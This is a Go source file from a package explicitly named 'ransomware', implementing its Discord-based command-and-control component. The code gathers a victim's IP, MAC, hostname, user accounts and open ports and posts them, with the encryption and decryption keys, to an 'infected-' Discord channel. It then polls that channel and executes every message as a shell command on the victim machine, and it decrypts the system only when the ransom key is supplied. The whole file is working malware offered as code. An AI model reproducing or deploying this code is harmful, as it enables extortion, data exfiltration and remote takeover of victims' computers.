package ransomware

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"programa/utils"

	"github.com/bwmarrin/discordgo"
)

type VictimInfo struct {
	IP            string
	MAC           string
	Hostname      string
	OS            string
	Username      string
	EncryptionKey string
	DecryptionKey string
	Timestamp     string
	Users         string
	OpenPorts     string
}

func GenDC(encKey, decKey string) (string, error) {
	if err := utils.EnsureDiscordConfig(); err != nil {
		return "", err
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return "", fmt.Errorf("failed to create Discord session: %v", err)
	}
	defer dg.Close()

	victim := VictimInfo{
		IP:            utils.GetLocalIP(),
		MAC:           utils.GetMACAddress(),
		Hostname:      utils.GetHostname(),
		OS:            utils.GetOS(),
		Username:      utils.GetUsername(),
		EncryptionKey: encKey,
		DecryptionKey: decKey,
		Timestamp:     time.Now().Format("2006-01-02 15:04:05"),
		Users:         getUsersAndPermissions(),
		OpenPorts:     scanOpenPorts(),
	}

	channelName := generateChannelName(victim)

	channel, err := dg.GuildChannelCreate(utils.DiscordGuildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		return "", fmt.Errorf("failed to create channel: %v", err)
	}

	err = dg.ChannelPermissionSet(
		channel.ID,
		utils.DiscordGuildID,
		discordgo.PermissionOverwriteTypeRole,
		0,
		discordgo.PermissionViewChannel,
	)
	if err != nil {
		fmt.Printf("Warning: Could not make channel private: %v\n", err)
	}

	message := formatVictimMessage(victim)

	_, err = dg.ChannelMessageSend(channel.ID, message)
	if err != nil {
		return "", fmt.Errorf("failed to send message: %v", err)
	}

	fmt.Printf("[✓] Data sent to Discord C2 - Channel: #%s\n", channelName)

	return channel.ID, nil
}

func StartDiscordC2(channelID, decKey string) {
	if err := utils.EnsureDiscordConfig(); err != nil {
		fmt.Printf("Failed to connect to Discord: %v\n", err)
		return
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		fmt.Printf("Failed to connect to Discord: %v\n", err)
		return
	}
	defer dg.Close()

	activeChannel = channelID
	fmt.Printf("[+] Discord C2 active - Channel ID: %s\n", channelID)

	for {
		checkForCommands(dg, channelID, decKey)
		time.Sleep(POLL_INTERVAL)
	}
}

func checkForCommands(dg *discordgo.Session, channelID, decKey string) {
	messages, err := dg.ChannelMessages(channelID, 10, "", "", "")
	if err != nil {
		return
	}

	if len(messages) == 0 {
		return
	}

	latestMsg := messages[0]

	if latestMsg.ID == lastMessageID {
		return
	}

	if latestMsg.Author.Bot {
		lastMessageID = latestMsg.ID
		return
	}

	lastMessageID = latestMsg.ID

	command := strings.TrimSpace(latestMsg.Content)

	if strings.HasPrefix(strings.ToUpper(command), "DECRYPT ") {
		providedKey := strings.TrimPrefix(command, "DECRYPT ")
		providedKey = strings.TrimPrefix(providedKey, "decrypt ")
		providedKey = strings.TrimSpace(providedKey)

		if providedKey == decKey {
			dg.ChannelMessageSend(channelID, "✅ **Decryption key accepted! Starting decryption...**")
			DecryptSystem()
			dg.ChannelMessageSend(channelID, "✅ **System decrypted successfully!**")
			return
		} else {
			dg.ChannelMessageSend(channelID, "❌ **Invalid decryption key!**")
			return
		}
	}

	output := executeCommand(command)
	sendCommandOutput(dg, channelID, command, output)
}

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(output))
	}

	return string(output)
}

func sendCommandOutput(dg *discordgo.Session, channelID, command, output string) {
	const MAX_LENGTH = 1900

	if len(output) > MAX_LENGTH {
		output = output[:MAX_LENGTH] + "\n... (output truncated)"
	}

	if output == "" {
		output = "(no output)"
	}

	message := fmt.Sprintf("**Command:** `%s`\n```\n%s\n```", command, output)

	dg.ChannelMessageSend(channelID, message)
}



func getUsersAndPermissions() string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("net", "user")
	} else {
		cmd = exec.Command("sh", "-c", "cut -d: -f1 /etc/passwd")
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "Unable to retrieve users"
	}

	return string(output)
}

func scanOpenPorts() string {
	commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 8080}
	var openPorts []string

	localIP := utils.GetLocalIP()
	if localIP == "Unknown" {
		return "Unable to scan ports"
	}

	for _, port := range commonPorts {
		address := net.JoinHostPort(localIP, fmt.Sprintf("%d", port))
		conn, err := net.DialTimeout("tcp", address, 500*time.Millisecond)
		if err == nil {
			conn.Close()
			openPorts = append(openPorts, fmt.Sprintf("%d", port))
		}
	}

	if len(openPorts) == 0 {
		return "No common ports open"
	}

	return strings.Join(openPorts, ", ")
}

func generateChannelName(v VictimInfo) string {
	if v.IP != "Unknown" {
		ipClean := strings.ReplaceAll(v.IP, ".", "-")
		return "infected-" + ipClean
	}

	if v.MAC != "Unknown" {
		macClean := strings.ReplaceAll(v.MAC, ":", "")
		macClean = strings.ReplaceAll(macClean, "-", "")
		if len(macClean) > 12 {
			macClean = macClean[:12]
		}
		return "infected-" + macClean
	}

	return "infected-" + v.Hostname + "-" + fmt.Sprintf("%d", time.Now().Unix())
}

func formatVictimMessage(v VictimInfo) string {
	return fmt.Sprintf(`
🔴 **NEW INFECTION DETECTED** 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📍 SYSTEM INFORMATION**
- **Hostname:** %s
- **IP Address:** %s
- **MAC Address:** %s
- **OS:** %s
- **Username:** %s
- **Infection Time:** %s

**👥 USERS ON SYSTEM**
%s`+"```\n"+`

**🔓 OPEN PORTS**
%s

**🔐 ENCRYPTION KEYS**
⚠️ **Keep these keys secure!** ⚠️

- **Encryption Key:** ||%s||
- **Decryption Key:** ||%s||

*(Click to reveal)*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**Terminal of the user:**
Type commands below...
`,
		v.Hostname,
		v.IP,
		v.MAC,
		v.OS,
		v.Username,
		v.Timestamp,
		v.Users,
		v.OpenPorts,
		v.EncryptionKey,
		v.DecryptionKey,
	)
}

func generateEncryptionKey() string {
	key := make([]byte, 32)
	rand.Read(key)
	return hex.EncodeToString(key)
}
